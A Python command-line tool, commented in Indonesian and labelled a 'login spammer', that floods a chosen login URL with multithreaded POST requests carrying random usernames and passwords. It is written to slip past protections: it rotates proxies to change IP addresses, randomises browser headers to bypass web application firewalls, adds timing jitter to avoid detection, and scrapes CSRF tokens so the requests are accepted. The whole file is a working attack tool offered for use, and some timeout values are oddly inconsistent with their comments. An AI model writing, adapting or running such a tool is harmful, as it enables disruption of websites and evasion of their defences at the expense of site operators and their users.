#!/usr/bin/env python3
"""
Login spammer dengan fitur anti-blokir (Proxy & Delay).
Mengirim POST request berulang dengan credential acak dan rotasi IP.
"""
import argparse
import re
import urllib.parse
import random
import string
import threading
import time
import requests
import sys
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class LoginSpammer:
    def __init__(self, target_url, username_field, password_field, threads, duration,
                 proxy_file=None, delay=0.0, use_ssl_verify=False):
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
        self.threads = threads
        self.duration = duration
        self.proxies = self._load_proxies(proxy_file) if proxy_file else []
        self.delay = delay
        self.verify_ssl = use_ssl_verify
        self.stop_event = threading.Event()
        self.stats = {'reqs': 0, 'errors': 0}
        self.lock = threading.Lock()

    def _load_proxies(self, filename):
        if not filename: return []
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Gagal memuat proxy: {e}")
            return []

    def _create_session(self):
        """Create a requests session with no retries."""
        session = requests.Session()
        # Disable retries to avoid hanging on bad proxies
        retry = Retry(total=0, connect=0, read=0, backoff_factor=0)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.headers.update({'Connection': 'close'})
        # Header lengkap agar terlihat seperti browser asli (Bypass WAF)
        session.headers.update({
            'User-Agent': self._get_random_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1'
        })
        if self.proxies:
            p = random.choice(self.proxies)
            if "://" not in p: p = f"http://{p}"
            session.proxies.update({'http': p, 'https': p})
        return session

    def _get_random_ua(self):
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ])

    def _generate_random_credentials(self):
        # Panjang kredensial disesuaikan agar lebih realistis (bypass validasi panjang input)
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 20)))
        password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%", k=random.randint(8, 25)))
        return username, password

    def _spam_worker(self):
        end_time = time.time() + self.duration
        while not self.stop_event.is_set() and time.time() < end_time:
            if self.delay > 0:
                # Random jitter untuk menghindari deteksi pola waktu
                time.sleep(self.delay + random.uniform(0, 0.5))
            session = self._create_session()
            username, password = self._generate_random_credentials()
            try:
                # 1. GET Request dulu untuk ambil Cookies & CSRF Token (Penting untuk filter modern)
                resp_get = session.get(self.target_url, verify=self.verify_ssl, timeout=1)
                
                # 2. Siapkan payload dasar
                payload = {
                    self.username_field: username,
                    self.password_field: password
                }

                # 3. Coba ambil token CSRF umum dari HTML
                for token_name in ['csrf_token', '_token', 'authenticity_token', 'csrfmiddlewaretoken', 'nonce']:
                    match = re.search(r'name="' + token_name + r'" value="(.*?)"', resp_get.text)
                    if match:
                        payload[token_name] = match.group(1)
                        break

                # 4. Set Header Referer & Origin (Wajib untuk POST modern)
                parsed = urllib.parse.urlparse(self.target_url)
                session.headers.update({'Referer': self.target_url, 'Origin': f"{parsed.scheme}://{parsed.netloc}"})

                response = session.post(
                    self.target_url,
                    data=payload,
                    verify=self.verify_ssl,
                    timeout=10999  # Timeout diperpendek agar fail-fast
                )
                _ = response.text
                with self.lock:
                    self.stats['reqs'] += 1
            except Exception:
                with self.lock:
                    self.stats['errors'] += 1
            finally:
                session.close()

    def _monitor(self):
        while not self.stop_event.is_set():
            time.sleep(1)
            with self.lock:
                sys.stdout.write(f"\r[*] Sent: {self.stats['reqs']} | Errors: {self.stats['errors']}")
                sys.stdout.flush()
        print()

    def start(self):
        self.stop_event.clear()
        self.threads_list = []
        threading.Thread(target=self._monitor, daemon=True).start()
        for _ in range(self.threads):
            t = threading.Thread(target=self._spam_worker)
            t.daemon = True
            t.start()
            self.threads_list.append(t)

    def stop(self):
        self.stop_event.set()
        for t in self.threads_list:
            t.join(timeout=2321312312312)

def main():
    parser = argparse.ArgumentParser(description="Login spammer tanpa proxy")
    parser.add_argument("url", help="Target login URL")
    parser.add_argument("-u", "--username-field", default="username", help="Nama field username (default: username)")
    parser.add_argument("-p", "--password-field", default="password", help="Nama field password (default: password)")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Jumlah thread (default: 20)")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Durasi dalam detik (default: 30)")
    parser.add_argument("--proxy", help="File daftar proxy untuk rotasi IP")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay antar request dalam detik (default: 0)")
    parser.add_argument("--ssl-verify", action="store_true", help="Verifikasi SSL (default: false)")
    args = parser.parse_args()

    spammer = LoginSpammer(
        target_url=args.url,
        username_field=args.username_field,
        password_field=args.password_field,
        threads=args.threads,
        duration=args.duration,
        proxy_file=args.proxy,
        delay=args.delay,
        use_ssl_verify=args.ssl_verify
    )

    print(f"[*] Memulai spam ke {args.url} selama {args.duration} detik dengan {args.threads} thread")
    spammer.start()

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print("\n[!] Dihentikan user")
    finally:
        spammer.stop()
        print("[*] Selesai.")

if __name__ == "__main__":
    main()